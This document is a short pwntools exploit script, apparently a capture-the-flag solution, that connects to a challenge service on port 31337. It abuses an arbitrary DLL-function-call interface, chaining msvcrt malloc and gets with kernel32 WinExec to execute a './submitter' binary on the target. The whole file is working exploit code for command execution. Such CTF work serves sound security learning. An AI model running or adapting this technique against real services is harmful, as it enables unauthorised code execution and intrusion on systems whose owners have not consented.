from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
io.sendlineafter(b'?\r\n', b'msvcrt.dll')
io.sendlineafter(b'?\r\n', b'malloc')
io.sendlineafter(b'?\r\n', str(0x100).encode())
io.recvuntil(b'\r\n')
out = io.recvuntil(b'\r\n').strip()

heap_addr = int(out.split(b': ')[-1],16)
print(hex(heap_addr))

io.sendlineafter('?\r\n', b'msvcrt.dll')
io.sendlineafter(b'?\r\n', b'gets')
io.sendlineafter(b'?\r\n', str(heap_addr).encode())
io.sendline(b'/bin/bash')

io.sendlineafter(b'?\r\n', b'kernel32.dll')
io.sendlineafter(b'?\r\n', b'WinExec')
io.sendlineafter(b'?\r\n', str(heap_addr).encode())
io.sendline(b'./submitter')


print(io.recv(1024))
io.close()